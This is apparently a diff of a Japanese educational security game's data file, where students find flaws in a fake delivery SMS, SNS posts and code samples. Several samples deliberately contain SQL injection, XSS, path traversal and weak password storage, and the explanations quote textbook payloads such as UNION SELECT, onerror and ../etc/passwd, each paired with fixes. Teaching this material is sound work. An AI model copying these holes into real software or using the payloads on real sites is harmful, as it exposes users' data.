+          "https://yamaneko-unyu.delivery-jp.top/track",
+          "※本日中にお手続きがない場合、荷物は返送されます。",
+          "※手続きには本人確認のためカード情報の入力が必要です。",
+        ],
+        vulns: [
+          { line: 0, name: "不自然な送信元", why: "国内の運送会社なのに海外（+1）の電話番号から届いている。", fix: "送信元が公式の番号や名前かを確認する。" },
+          { line: 3, name: "偽のURL", why: "本当のドメインは「delivery-jp.top」。運送会社の公式ドメインではない。", fix: "SMSのリンクは押さず、公式アプリや公式サイトから追跡番号で確認する。" },
+          { line: 4, name: "焦らせる文", why: "「本日中に」と時間を区切って、考える時間を奪っている。", fix: "急がされるほど疑う。" },
+          { line: 5, name: "カード情報の要求", why: "再配達にクレジットカード情報は不要。お金や情報を盗むのが目的。", fix: "カード番号やパスワードを求められたら入力しない。" },
+        ],
+        neutral: [1, 2],
+        hint: "送信元の番号、URLの本当の持ち主、そして「何を入力させようとしているか」を見よう。",
+      },
     ],
-    vulns: [
-      { line: 3, name: "SQLインジェクション",
-        why: "入力をそのまま文字列でつなげてSQLを作っている。ユーザー名に「' OR '1'='1' --」と入れると、パスワードなしでログインできてしまう。",
-        fix: 'query = "SELECT * FROM users WHERE name=? AND pass=?"\nresult = db.execute(query, (user, pw))  # プレースホルダを使う' },
+    quizzes: [
+      { q: "フィッシングかも？と思ったときの正しい行動は？", choices: ["とりあえずリンクを開いて確かめる", "メールに返信して本物か聞く", "リンクは押さず、公式サイトや先生に確認する", "友達に転送して意見を聞く"], answer: 2, explain: "リンクを開くだけで危険な場合もあります。メール以外の方法で本物かどうか確認しましょう。" },
+      { q: "【試験風】電話やメールで人の心理的なすきや油断につけ込み、パスワードなどの秘密情報を不正に入手する手口の総称はどれか。", choices: ["ソーシャルエンジニアリング", "ブルートフォース攻撃", "SQLインジェクション", "DoS攻撃"], answer: 0, explain: "人をだます手口全般をソーシャルエンジニアリングと呼びます。フィッシングはその代表例です。" },
     ],
-    neutral: [4],
-    hint: "ユーザーが入力した文字が、どこにそのまま入り込んでいる？",
-    quiz: {
-      q: "SQLインジェクションを防ぐいちばん良い方法は？",
-      choices: ["入力欄の文字数を短くする", "プレースホルダ（プリペアドステートメント）を使う", "SQLを英語ではなく日本語で書く", "ログイン失敗の回数を表示する"],
-      answer: 1,
-      explain: "プレースホルダを使うと、入力は「ただのデータ」として扱われ、SQL文の一部として実行されなくなります。"
-    }
+    lesson: {
+      what: "本物そっくりのメールやSMS、Webサイトを使って、パスワードやクレジットカード番号などをだまし取る詐欺です。魚釣り（fishing）のようにエサで釣ることが語源と言われています。システムの穴ではなく「人の心のすき」を突く攻撃（ソーシャルエンジニアリング）の代表です。",
+      exampleLabel: "URLの「本当の持ち主」の見分け方：",
+      example: "http://schoo1-portal.com.login-check.xyz/reset\n\n分解すると：\n・schoo1-portal.com. … 本物っぽく見せる飾り\n・login-check.xyz … 本当の持ち主（学校とは無関係）\n\n→ ドメインは「http:// の後、最初の / の直前」の右端を見る",
+      danger: "アカウントの乗っ取り、お金の被害、乗っ取られたアカウントから友達にさらに詐欺メールが送られる など。",
+      defense: [
+        "見分けポイント：差出人のアドレス、急がせる・脅す文面、URLの本当のドメイン",
+        "メールやSMSのリンクは押さず、ブックマークや公式アプリからアクセスする",
+        "多要素認証（パスワード＋スマホの確認コードなど）を設定しておく",
+        "怪しいと思ったら一人で判断せず、先生や家族に相談する",
+      ],
+      tip: "SMSを使ったものは「スミッシング」と呼ばれます。宅配便の不在通知を装ったものが多いので要注意。",
+    },
+    examPoint: "「ソーシャルエンジニアリングの例はどれか」という形で、フィッシング・ショルダーハッキング・トラッシングなどが選択肢に並ぶ問題がよく出ます。",
+    terms: [
+      { t: "フィッシング", d: "実在の組織を装った偽のメールやWebサイトで、IDやパスワード、カード番号などをだまし取る手口。" },
+      { t: "ソーシャルエンジニアリング", d: "技術ではなく、人の心理的なすきや油断につけ込んで秘密情報を盗み出す手口の総称。" },
+      { t: "スミッシング", d: "SMS（ショートメッセージ）を使ったフィッシング。" },
+      { t: "多要素認証", d: "知識（パスワード）・所持（スマホ）・生体（指紋）のうち、異なる2つ以上の要素を組み合わせる認証方式。" },
+    ],
   },
+
+  /* ---------------- 2. SNSと個人情報 ---------------- */
   {
-    title: "コメント掲示板の診断",
-    client: "依頼主：文化祭実行委員会",
-    type: "JavaScript / XSS",
-    scenario: "文化祭サイトにコメント機能をつけました。名前とコメントを書くと一覧に表示されます。",
-    lines: [
-      'const form = document.getElementById("comment-form");',
-      'form.addEventListener("submit", (e) => {',
-      '  e.preventDefault();',
-      '  const name = form.name.value;',
-      '  const text = form.text.value;',
-      '  const li = document.createElement("li");',
-      '  li.innerHTML = "<b>" + name + "</b>: " + text;',
-      '  document.getElementById("list").appendChild(li);',
-      '});',
+    id: "sns", name: "SNSと個人情報", cat: "human",
+    story: "調べてみると、ブラックマンバは生徒のSNSから情報を集めているらしい。何気ない投稿が、攻撃者にとっては宝の山になる。",
+    variants: [
+      {
+        title: "生徒のSNSチェック", client: "依頼主：生徒指導の先生", type: "SNS",
+        scenario: "ある生徒の公開SNSアカウントです。攻撃者やストーカーに悪用されそうな情報を全部見つけてください。",
+        lines: [
+          "@manabi_taro（公開アカウント）",
+          "プロフィール：まなび高校2年3組 / 野球部 / 誕生日 4月12日",
+          "投稿：今日から家族で沖縄旅行！1週間家が空っぽ〜",
+          "投稿：［写真］家の前で新しい自転車！（位置情報付き）",
+          "投稿：好きな食べ物はラーメン",
+          "投稿：ペットの名前はポチ。パスワードにも使ってるくらい大好き笑",
+        ],
+        vulns: [
+          { line: 1, name: "個人を特定できるプロフィール", why: "学校名・クラス・部活・誕生日を組み合わせると、本人を簡単に特定できる。誕生日はパスワード推測にも使われる。", fix: "プロフィールに学校名やクラス、誕生日を書かない。" },
+          { line: 2, name: "留守の宣言", why: "「1週間家が空っぽ」は空き巣に教えているのと同じ。", fix: "旅行の投稿は帰ってきてからにする。" },
+          { line: 3, name: "位置情報付きの自宅写真", why: "写真の位置情報や背景から自宅の場所が分かってしまう。", fix: "カメラの位置情報をオフにする。自宅周辺が写った写真は載せない。" },
+          { line: 5, name: "パスワードのヒント", why: "パスワードにペットの名前を使っていると自分で公開している。", fix: "パスワードに個人情報を使わない。秘密の質問の答えも投稿しない。" },
+        ],
+        neutral: [0],
+        hint: "「どこの誰か」「いつ家にいないか」「どこに住んでいるか」「パスワードの手がかり」の4つ。",
+      },
+      {
+        title: "投稿写真のチェック", client: "依頼主：写真部の部長", type: "写真の分析",
+        scenario: "部活の集合写真をSNSに載せようとしています。写り込みやファイル情報に問題がないか見てください。",
+        lines: [
+          "投稿写真：教室で友達と撮った集合写真",
+          "写真に写っているもの：",
+          "・後ろの黒板に書かれた時間割",
+          "・机の上の生徒手帳（名前と住所が読める）",
+          "・窓の外に見える最寄り駅の看板",
+          "・みんなでピースしている手（指紋がくっきり）",
+          "・青い空",
+          "写真のファイル情報：撮影日時 / GPS座標 35.6812, 139.7671",
+        ],
+        vulns: [
+          { line: 3, name: "個人情報の写り込み", why: "生徒手帳の名前と住所が読めてしまう。", fix: "投稿前に拡大して確認し、写り込みは隠すか撮り直す。" },
+          { line: 4, name: "場所が分かる写り込み", why: "駅の看板から学校や生活圏が特定される。", fix: "看板や特徴的な建物が写らないようにする。" },
+          { line: 5, name: "指紋の写り込み", why: "高画質な写真のピースサインから指紋を読み取れるという研究がある。", fix: "手のひらを正面に向けたアップの写真は避ける。" },
+          { line: 7, name: "位置情報（Exif）付き", why: "写真ファイルにGPS座標が埋め込まれていると、撮影場所が正確に分かる。", fix: "カメラの位置情報をオフにするか、位置情報を消してから投稿する。" },
+        ],
+        neutral: [2],
+        hint: "写っている物だけでなく、写真ファイルに隠れている情報にも注目。",
+      },
     ],
-    vulns: [
-      { line: 6, name: "クロスサイトスクリプティング（XSS）",
-        why: "入力をinnerHTMLでそのままHTMLとして表示している。コメントに <img src=x onerror=\"...\"> などを書かれると、見た人のブラウザで悪いスクリプトが動く。",
-        fix: 'const b = document.createElement("b");\nb.textContent = name;           // 文字として表示\nli.append(b, ": " + text);' },
+    quizzes: [
+      { q: "SNSに写真を投稿する前にやるべきことは？", choices: ["できるだけ高画質にする", "写り込みと位置情報を確認する", "全員の名前をタグ付けする", "投稿時間を深夜にする"], answer: 1, explain: "背景や写真ファイルの情報から、思った以上に多くのことが分かります。投稿前の確認が大切です。" },
+      { q: "【試験風】デジタルカメラやスマートフォンで撮影した画像ファイルに埋め込まれ、撮影日時や撮影場所の緯度・経度などを記録できる情報はどれか。", choices: ["Exif情報", "MACアドレス", "Cookie", "SSL証明書"], answer: 0, explain: "Exif（イグジフ）情報には位置情報（ジオタグ）が含まれることがあります。" },
     ],
-    neutral: [],
-    hint: "入力された文字が「文字」ではなく「HTML」として扱われている行は？",
-    quiz: {
-      q: "XSSを防ぐために、表示するときにやるべきことは？",
-      choices: ["入力をHTMLとして解釈しない（エスケープ / textContentを使う）", "背景色を変える", "コメントを1日で消す", "ボタンを大きくする"],
-      answer: 0,
-      explain: "< > \" などを無害な文字に変換（エスケープ）するか、textContentで「文字として」表示します。"
-    }
+    lesson: {
+      what: "SNSに投稿した情報は、世界中の誰でも見られる可能性があります。1つ1つは何でもない情報でも、組み合わせると「どこの誰で、どこに住んでいて、いつ家にいないか」まで分かってしまいます。攻撃者はこうした公開情報を集めて、なりすましやパスワード推測、ストーカー行為などに悪用します。",
+      exampleLabel: "組み合わせると分かってしまうこと：",
+      example: "学校名 ＋ クラス ＋ 部活 → 本人が特定できる\n誕生日 ＋ ペットの名前 → パスワードや秘密の質問を推測できる\n写真の位置情報 ＋ 背景 → 自宅や学校の場所が分かる\n「今から旅行」 → 家が留守だと分かる",
+      danger: "なりすまし、アカウントの乗っ取り、ストーカー被害、空き巣。一度ネットに出た情報は、消しても誰かが保存している可能性がある（デジタルタトゥー）。",
+      defense: [
+        "プロフィールに本名・学校名・誕生日などを書かない",
+        "写真の位置情報（ジオタグ）をオフにする",
+        "投稿前に、写り込み（名前・住所・制服・看板・窓の景色）を確認する",
+        "旅行などの「今どこにいるか」の投稿は、帰ってきてからにする",
+        "公開範囲を確認し、知らない人とはつながらない",
+      ],
+      tip: "瞳に映った景色から住所を特定された事件もあります。「この写真から何が分かるか」を攻撃者の目で見るのがホワイトハッカー的な考え方です。",
+    },
+    examPoint: "情報セキュリティマネジメント試験では、Exif情報や、SNSでの情報漏えいを防ぐための社内ルール（ソーシャルメディアポリシー）が問われます。",
+    terms: [
+      { t: "Exif情報", d: "画像ファイルに埋め込まれる、撮影日時・カメラの機種・撮影場所（緯度・経度）などの情報。" },
+      { t: "ショルダーハッキング", d: "パスワードを入力している人の肩越しに画面やキー操作をのぞき見て、情報を盗む手口。" },
+      { t: "トラッシング", d: "ゴミ箱に捨てられた書類やメモなどをあさって、秘密情報を手に入れる手口。" },
+      { t: "ソーシャルメディアポリシー", d: "組織がSNSの利用について定めるルールや方針。" },
+    ],
   },
+
+  /* ---------------- 3. SQLインジェクション ---------------- */
   {
-    title: "怪しいメールの調査",
-    client: "依頼主：先生（受信したメールの調査依頼）",
-    type: "メール / フィッシング",
-    scenario: "「学校ポータル」からこんなメールが届きました。本物でしょうか？怪しいポイントを全部見つけてください。",
-    lines: [
-      '差出人: 学校ポータル事務局 <support@schoo1-portal.com>',
-      '件名: 【至急】アカウントが停止されました',
-      '',
-      'いつも学校ポータルをご利用いただきありがとうございます。',
-      '不正なアクセスを検知したため、アカウントを一時停止しました。',
-      '24時間以内に下記URLからパスワードを再設定してください。',
-      'http://schoo1-portal.com.login-check.xyz/reset',
-      '再設定しない場合、成績データはすべて削除されます。',
-      '',
-      '学校ポータル事務局',
+    id: "sqli", name: "SQLインジェクション", cat: "web",
+    story: "人をだます作戦が通じないと分かると、ブラックマンバは学校のWebサイトそのものを攻撃し始めた。まずは入口のログイン画面だ。",
+    variants: [
+      {
+        title: "ログイン画面の診断", client: "依頼主：まなび高校 Webサイト担当", type: "Python",
+        scenario: "生徒用ログイン画面を作りました。ユーザー名とパスワードでログインできます。危ないところがないか見てください。",
+        lines: [
+          'def login(request):',
+          '    user = request.form["username"]',
+          '    pw   = request.form["password"]',
+          '    query = "SELECT * FROM users WHERE name=\'" + user + "\' AND pass=\'" + pw + "\'"',
+          '    result = db.execute(query)',
+          '    if result:',
+          '        return "ようこそ"',
+          '    return "ログイン失敗"',
+        ],
+        vulns: [
+          { line: 3, name: "SQLインジェクション", why: "入力をそのまま文字列でつなげてSQLを作っている。ユーザー名に「' OR '1'='1' --」と入れると、パスワードなしでログインできてしまう。", fix: 'query = "SELECT * FROM users WHERE name=? AND pass=?"\nresult = db.execute(query, (user, pw))  # プレースホルダを使う' },
+        ],
+        neutral: [4],
+        hint: "ユーザーが入力した文字が、どこにそのまま入り込んでいる？",
+      },
+      {
+        title: "購買部の検索機能の診断", client: "依頼主：購買部ネットショップ担当", type: "PHP",
+        scenario: "購買部の商品を検索できるページです。表示のときにエスケープもしているので安全なはず、とのこと。",
+        lines: [
+          '<?php',
+          '$keyword = $_GET["q"];',
+          '$sql = "SELECT title, price FROM products WHERE title LIKE \'%$keyword%\'";',
+          '$rows = $pdo->query($sql);',
+          'foreach ($rows as $row) {',
+          '    echo htmlspecialchars($row["title"]) . "<br>";',
+          '}',
+        ],
+        vulns: [
+          { line: 2, name: "SQLインジェクション", why: "検索語が直接SQLに埋め込まれている。「' UNION SELECT name, pass FROM users --」などで、商品以外の情報（会員のパスワードなど）まで抜き出せる。", fix: '$stmt = $pdo->prepare("SELECT title, price FROM products WHERE title LIKE ?");\n$stmt->execute(["%" . $keyword . "%"]);' },
+        ],
+        neutral: [3],
+        hint: "5行目の htmlspecialchars は表示のための対策。SQLを作る部分は大丈夫？",
+      },
     ],
-    vulns: [
-      { line: 0, name: "なりすましドメイン",
-        why: "「school」ではなく「schoo1」（数字の1）。本物そっくりの偽ドメイン。",
-        fix: "差出人のアドレスを1文字ずつ確認する。公式サイトのドメインと比べる。" },
-      { line: 1, name: "焦らせる件名",
-        why: "【至急】【停止】など、慌てさせて冷静に考えさせないのはフィッシングの典型。",
-        fix: "急がされたときこそ一度止まって、別の方法（電話や公式サイト）で確認する。" },
-      { line: 6, name: "偽のURL",
-        why: "本当のドメインは最後の「login-check.xyz」。前半に本物っぽい名前を入れてごまかしている。しかもhttp（暗号化なし）。",
-        fix: "メールのリンクは押さず、ブックマークや公式アプリからアクセスする。" },
-      { line: 7, name: "脅し文句",
-        why: "「データが削除される」と脅して行動させようとしている。本物の学校はこんな連絡をしない。",
-        fix: "怪しいと思ったら先生や情報担当に相談する。" },
+    quizzes: [
+      { q: "SQLインジェクションを防ぐいちばん良い方法は？", choices: ["入力欄の文字数を短くする", "プレースホルダ（プリペアドステートメント）を使う", "SQLを小文字で書く", "ログイン失敗の回数を表示する"], answer: 1, explain: "プレースホルダを使うと、入力は「ただのデータ」として扱われ、SQL文の一部として実行されなくなります。" },
+      { q: "【試験風】SQLインジェクション対策として、SQL文のひな形の中に変数の場所を示す記号を置き、実際の値を後から割り当てる仕組みはどれか。", choices: ["バインド機構（プレースホルダ）", "サニタイジング", "ハッシュ化", "ファイアウォール"], answer: 0, explain: "値を後から割り当てる仕組みをバインド機構と呼びます。試験でも頻出です。" },
     ],
-    neutral: [4, 5],
-    hint: "差出人のアドレスとURLを1文字ずつよく見てみよう。怪しいポイントは4つ。",
-    quiz: {
-      q: "フィッシングメールかも？と思ったときの正しい行動は？",
-      choices: ["とりあえずリンクを開いて確かめる", "メールに返信して本物か聞く", "リンクは押さず、公式サイトや先生に確認する", "友達に転送して意見を聞く"],
-      answer: 2,
-      explain: "リンクを開くだけで危険な場合もあります。メール以外の方法で本物かどうか確認しましょう。"
-    }
+    lesson: {
+      what: "Webサイトの裏側では、データベース（情報をしまっておく倉庫）に「SQL」という命令文で「この人の情報をちょうだい」と問い合わせています。入力欄にSQLの一部を書き込んで、この命令文の意味を書き換えてしまう攻撃がSQLインジェクションです（インジェクション＝注入）。",
+      exampleLabel: "ユーザー名に「' OR '1'='1' --」と入力すると、命令文はこうなる：",
+      example: "SELECT * FROM users WHERE name='' OR '1'='1' --' AND pass=''\n\n→ '1'='1' は常に正しい（真）\n→ -- から後ろはコメント扱いで無視される\n→ パスワードのチェックが消えてログインできてしまう！",
+      danger: "パスワードなしでの不正ログイン、個人情報の大量流出、データの書き換えや削除など。",
+      defense: [
+        "プレースホルダ（プリペアドステートメント）を使い、入力を「ただのデータ」として扱う",
+        "入力値の形式をチェックする（数字だけの欄に記号が来たら拒否など）",
+        "データベースのアカウントには必要最低限の権限だけを与える",
+        "エラーの詳しい内容を利用者に見せない",
+        "WAFを入れて攻撃を検知・遮断する（あくまで補助）",
+      ],
+      tip: "実際に何百万件もの個人情報が漏れた事件の原因になってきた、最も有名な脆弱性の一つです。",
+    },
+    examPoint: "基本情報・情報セキュリティマネジメントの両方で頻出。「対策として適切なもの＝バインド機構（プレースホルダ）」をセットで覚えましょう。",
+    terms: [
+      { t: "SQLインジェクション", d: "入力欄などに不正なSQL文の一部を入力し、データベースを不正に操作する攻撃。" },
+      { t: "バインド機構", d: "SQL文のひな形に置いたプレースホルダに、実際の値を後から割り当てる仕組み。SQLインジェクション対策の基本。" },
+      { t: "WAF", d: "Web Application Firewall。Webアプリケーションへの通信を検査し、SQLインジェクションやXSSなどの攻撃を検知・遮断する仕組み。" },
+    ],
   },
+
+  /* ---------------- 4. XSS ---------------- */
   {
-    title: "会員登録機能の診断",
-    client: "依頼主：部活動アプリ開発チーム",
-    type: "Python / パスワード管理",
-    scenario: "部活アプリに会員登録を作りました。パスワードはハッシュ化しているので安全…なはずです。",
-    lines: [
-      'import hashlib',
-      'def register(username, password):',
-      '    if len(password) < 4:',
-      '        raise ValueError("パスワードが短すぎます")',
-      '    hashed = hashlib.md5(password.encode()).hexdigest()',
-      '    db.insert("users", name=username, password=hashed)',
-      '    log.info(f"新規登録: {username} / {password}")',
-      '    return "登録完了"',
+    id: "xss", name: "クロスサイトスクリプティング（XSS）", cat: "web",
+    story: "ログイン画面は守った。次にブラックマンバが目をつけたのは、生徒が自由に書き込めるページだ。",
+    variants: [
+      {
+        title: "コメント掲示板の診断", client: "依頼主：文化祭実行委員会", type: "JavaScript",
+        scenario: "文化祭サイトにコメント機能をつけました。名前とコメントを書くと一覧に表示されます。",
+        lines: [
+          'const form = document.getElementById("comment-form");',
+          'form.addEventListener("submit", (e) => {',
+          '  e.preventDefault();',
+          '  const name = form.name.value;',
+          '  const text = form.text.value;',
+          '  const li = document.createElement("li");',
+          '  li.innerHTML = "<b>" + name + "</b>: " + text;',
+          '  document.getElementById("list").appendChild(li);',
+          '});',
+        ],
+        vulns: [
+          { line: 6, name: "クロスサイトスクリプティング（XSS）", why: "入力をinnerHTMLでそのままHTMLとして表示している。コメントに <img src=x onerror=\"...\"> などを書かれると、見た人のブラウザで悪いスクリプトが動く。", fix: 'const b = document.createElement("b");\nb.textContent = name;           // 文字として表示\nli.append(b, ": " + text);' },
+        ],
+        neutral: [],
+        hint: "入力された文字が「文字」ではなく「HTML」として扱われている行は？",
+      },
+      {
+        title: "サイト内検索の診断", client: "依頼主：図書委員会", type: "JavaScript",
+        scenario: "図書室の蔵書検索ページです。URLの ?q=○○ に検索語が入り、結果の見出しに表示されます。",
+        lines: [
+          'const params = new URLSearchParams(location.search);',
+          'const q = params.get("q");',
+          'document.getElementById("title").innerHTML = "「" + q + "」の検索結果";',
+          'const results = searchBooks(q);',
+          'document.getElementById("count").textContent = results.length + "件";',
+        ],
+        vulns: [
+          { line: 2, name: "XSS（URL経由）", why: "URLのパラメータをinnerHTMLで表示している。攻撃者が ?q=<script>…<\/script> 入りのURLを作って誰かに踏ませると、その人のブラウザでスクリプトが動く。", fix: 'document.getElementById("title").textContent = "「" + q + "」の検索結果";' },
+        ],
+        neutral: [1],
+        hint: "5行目はtextContentを使っている。3行目との違いは？",
+      },
     ],
-    vulns: [
-      { line: 2, name: "弱いパスワードを許可",
-        why: "4文字で登録できてしまう。「1234」などはすぐに総当たりで破られる。",
-        fix: "if len(password) < 12:   # 長さを十分にとる\n    raise ValueError(...)" },
-      { line: 4, name: "弱いハッシュ（MD5・ソルトなし）",
-        why: "MD5は高速すぎて総当たりに弱く、ソルトもないので同じパスワードは同じ値になり、事前計算表（レインボーテーブル）で一発で分かる。",
-        fix: "import bcrypt\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())" },
-      { line: 6, name: "パスワードをログに記録",
-        why: "せっかくハッシュ化しても、ログに平文のパスワードが残ったら意味がない。",
-        fix: 'log.info(f"新規登録: {username}")   # パスワードは絶対に書かない' },
+    quizzes: [
+      { q: "XSSを防ぐために、表示するときにやるべきことは？", choices: ["入力をHTMLとして解釈しない（エスケープ / textContentを使う）", "背景色を変える", "コメントを1日で消す", "ボタンを大きくする"], answer: 0, explain: "< > \" などを無害な文字に変換（エスケープ）するか、textContentで「文字として」表示します。" },
+      { q: "【試験風】クロスサイトスクリプティング対策として、Webページに出力する文字のうち「<」や「>」などの特別な意味を持つ記号を、別の文字列に置き換える処理はどれか。", choices: ["エスケープ処理", "暗号化", "圧縮", "ハッシュ化"], answer: 0, explain: "「<」を「&lt;」に置き換えるような処理をエスケープ（サニタイジング）と呼びます。" },
     ],
-    neutral: [],
-    hint: "穴は3つ。「長さ」「ハッシュの種類」「どこかに書き出している」に注目。",
-    quiz: {
-      q: "パスワードを保存する方法として最も適切なのは？",
-      choices: ["そのまま（平文）で保存", "MD5でハッシュ化して保存", "bcryptなど、ソルト付きで遅いハッシュ関数を使う", "Base64で変換して保存"],
-      answer: 2,
-      explain: "bcrypt / Argon2 などはわざと計算を遅くし、ソルトも自動で付けるので総当たりに強いです。Base64はただの変換で、すぐ元に戻せます。"
-    }
+    lesson: {
+      what: "掲示板やコメント欄などに書き込んだ「スクリプト（プログラム）」が、そのページを見た別の人のブラウザで実行されてしまう脆弱性です。入力された文字を、文字としてではなくHTMLとして表示してしまうことが原因です。",
+      exampleLabel: "コメント欄にこんな文字を書き込まれると…",
+      example: '<img src=x onerror="alert(document.cookie)">\n\n→ 画像の読み込みに失敗した瞬間に onerror の中身が実行される\n→ alert の代わりに「Cookieを攻撃者に送る」処理を書かれたら？',
+      danger: "ログイン情報（Cookie）を盗まれてなりすましされる、偽のログイン画面を表示される、勝手に投稿される など。",
+      defense: [
+        "表示するときにエスケープする（< を &lt; に、> を &gt; に変換するなど）",
+        "JavaScriptでは innerHTML ではなく textContent を使う",
+        "CSP（コンテンツセキュリティポリシー）で、実行してよいスクリプトを制限する",
+        "Cookieに HttpOnly 属性を付け、スクリプトから読めないようにする",
+      ],
+      tip: "「入力はすべて疑う」「出力するときは必ず無害化」がWebセキュリティの合言葉です。",
+    },
+    examPoint: "「XSSの対策＝出力時のエスケープ」「SQLインジェクションの対策＝バインド機構」と、攻撃と対策の組み合わせで問われます。",
+    terms: [
+      { t: "クロスサイトスクリプティング", d: "Webページに悪意のあるスクリプトを埋め込み、閲覧者のブラウザで実行させる攻撃。XSSと略す。" },
+      { t: "エスケープ処理", d: "HTMLで特別な意味を持つ「<」「>」「&」などの記号を、別の文字列に置き換えて無害化する処理。" },
+      { t: "CSP", d: "Content Security Policy。Webページで読み込み・実行してよいスクリプトなどの取得元を制限する仕組み。" },
+    ],
   },
+
+  /* ---------------- 5. パスワード ---------------- */
   {
-    title: "ファイルダウンロード機能の診断",
-    client: "依頼主：学校の配布資料サイト",
-    type: "Python / ディレクトリトラバーサル",
-    scenario: "プリントのPDFを /download?file=xxx.pdf でダウンロードできるようにしました。",
-    lines: [
-      'from flask import request, send_file',
-      '@app.route("/download")',
-      'def download():',
-      '    filename = request.args.get("file")',
-      '    path = "/var/www/uploads/" + filename',
-      '    return send_file(path)',
+    id: "password", name: "パスワードの安全な管理", cat: "auth",
+    story: "書き込みページも守った。だがブラックマンバの本当の狙いは生徒のパスワードらしい。パスワードの扱い方を調べよう。",
+    variants: [
+      {
+        title: "会員登録機能の診断", client: "依頼主：部活動アプリ開発チーム", type: "Python",
+        scenario: "部活アプリに会員登録を作りました。パスワードはハッシュ化しているので安全…なはずです。",
+        lines: [
+          'import hashlib',
+          'def register(username, password):',
+          '    if len(password) < 4:',
+          '        raise ValueError("パスワードが短すぎます")',
+          '    hashed = hashlib.md5(password.encode()).hexdigest()',
+          '    db.insert("users", name=username, password=hashed)',
+          '    log.info(f"新規登録: {username} / {password}")',
+          '    return "登録完了"',
+        ],
+        vulns: [
+          { line: 2, name: "弱いパスワードを許可", why: "4文字で登録できてしまう。「1234」などはすぐに総当たりで破られる。", fix: "if len(password) < 12:   # 十分な長さを求める\n    raise ValueError(...)" },
+          { line: 4, name: "弱いハッシュ（MD5・ソルトなし）", why: "MD5は高速すぎて総当たりに弱く、ソルトもないので同じパスワードは同じ値になる。事前計算表（レインボーテーブル）ですぐ分かる。", fix: "import bcrypt\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())" },
+          { line: 6, name: "パスワードをログに記録", why: "せっかくハッシュ化しても、ログに平文のパスワードが残ったら意味がない。", fix: 'log.info(f"新規登録: {username}")   # パスワードは絶対に書かない' },
+        ],
+        neutral: [],
+        hint: "穴は3つ。「長さ」「ハッシュの種類」「どこかに書き出している」に注目。",
+      },
+      {
+        title: "ログインとパスワード再発行の診断", client: "依頼主：図書室予約システム担当", type: "Python",
+        scenario: "ログインと、パスワードを忘れた人のための再発行機能です。親切なエラーメッセージにこだわりました！",
+        lines: [
+          'def login(username, password):',
+          '    user = db.find_user(username)',
+          '    if user is None:',
+          '        return "そのユーザーは存在しません"',
+          '    if user.password != password:',
+          '        return "パスワードが違います"',
+          '    return "ログイン成功"',
+          '',
+          'def reset_password(username):',
+          '    new_pw = username + "123"',
+          '    send_mail(username, new_pw)',
+        ],
+        vulns: [
+          { line: 3, name: "ユーザーの存在が分かるメッセージ", why: "「存在しません」と「パスワードが違います」を区別すると、攻撃者は登録されているユーザー名を調べられる。", fix: 'return "ユーザー名またはパスワードが違います"   # どちらが違うか教えない' },
+          { line: 4, name: "パスワードを平文で保存・比較", why: "保存されたパスワードとそのまま比べている＝データベースに平文で保存されている。漏れたら全員のパスワードがそのまま読まれる。", fix: "if not bcrypt.checkpw(password.encode(), user.password_hash):" },
+          { line: 9, name: "推測できる仮パスワード", why: "ユーザー名＋123なので、誰でも他人の仮パスワードを予想できる。", fix: "new_pw = secrets.token_urlsafe(16)   # ランダムに作る\n# さらに、再設定用のリンクを送る方式にするのがより安全" },
+        ],
+        neutral: [5, 10],
+        hint: "攻撃者に「ヒント」を与えているメッセージ、保存のしかた、仮パスワードの作り方。",
+      },
     ],
-    vulns: [
-      { line: 4, name: "ディレクトリトラバーサル",
-        why: "file=../../../etc/passwd のように「../」を使うと、uploadsフォルダの外にある重要なファイルまで読めてしまう。",
-        fix: "from werkzeug.utils import secure_filename\npath = os.path.join(UPLOAD_DIR, secure_filename(filename))\n# さらに、許可したファイル一覧と照合するとより安全" },
+    quizzes: [
+      { q: "パスワードを保存する方法として最も適切なのは？", choices: ["そのまま（平文）で保存", "MD5でハッシュ化して保存", "bcryptなど、ソルト付きで遅いハッシュ関数を使う", "Base64で変換して保存"], answer: 2, explain: "bcrypt / Argon2 などはわざと計算を遅くし、ソルトも自動で付けるので総当たりに強いです。Base64はただの変換で、すぐ元に戻せます。" },
+      { q: "【試験風】あるサービスから流出したIDとパスワードの組み合わせを使って、別のサービスへのログインを試みる攻撃はどれか。", choices: ["パスワードリスト攻撃", "辞書攻撃", "ブルートフォース攻撃", "リバースブルートフォース攻撃"], answer: 0, explain: "パスワードの使い回しを狙う攻撃です。辞書攻撃は辞書の単語を、ブルートフォース攻撃は全組み合わせを試す攻撃です。" },
     ],
-    neutral: [3, 5],
-    hint: "ファイル名に「../」が入っていたらどうなる？",
-    quiz: {
-      q: "「../」の意味は？",
-      choices: ["1つ上のフォルダ", "ファイルの削除", "管理者権限", "ファイルの圧縮"],
-      answer: 0,
-      explain: "「../」は1つ上のフォルダを表します。何回も重ねると、本来見せてはいけない場所までたどり着けてしまいます。"
-    }
+    lesson: {
+      what: "サービス側はパスワードをそのまま保存してはいけません。「ハッシュ関数」という、元に戻せない一方向の変換をして保存します。さらに、ユーザーごとにランダムな文字（ソルト＝塩）を混ぜてからハッシュ化することで、同じパスワードでも違う値になるようにします。",
+      exampleLabel: "MD5・ソルトなしだと…",
+      example: "「1234」の MD5 → 81dc9bdb52d04dc20036dbd8313ed055\n\n→ 誰が計算しても毎回同じ値\n→ ネットで検索するだけで元の「1234」が分かってしまう",
+      danger: "データベースが漏れたとき、パスワードがすぐにバレる。同じパスワードを使い回していると、他のサービスまで次々と乗っ取られる（パスワードリスト攻撃）。",
+      defense: [
+        "【作る側】bcrypt や Argon2 など、ソルト付きで計算がわざと遅いハッシュ関数を使う",
+        "【作る側】短すぎるパスワードを登録させない。ログにパスワードを書かない",
+        "【作る側】ログイン失敗のメッセージで、IDとパスワードのどちらが違うか教えない",
+        "【使う側】長いパスワード（単語をつなげたパスフレーズなど）にする",
+        "【使う側】使い回さない。パスワード管理アプリや多要素認証を使う",
+      ],
+      tip: "「暗号化」は鍵があれば元に戻せますが、「ハッシュ化」は元に戻せません。パスワードの保存にはハッシュ化を使います。",
+    },
+    examPoint: "ブルートフォース・辞書攻撃・パスワードリスト攻撃・リバースブルートフォース攻撃の違いは超頻出。ソルトとストレッチング（ハッシュ化を何回も繰り返すこと）もセットで覚えましょう。",
+    terms: [
+      { t: "ハッシュ関数", d: "データから固定長の値を作る一方向の関数。結果から元のデータに戻すことはできない。" },
+      { t: "ソルト", d: "パスワードをハッシュ化する前に付け加える、ユーザーごとに異なるランダムな文字列。" },
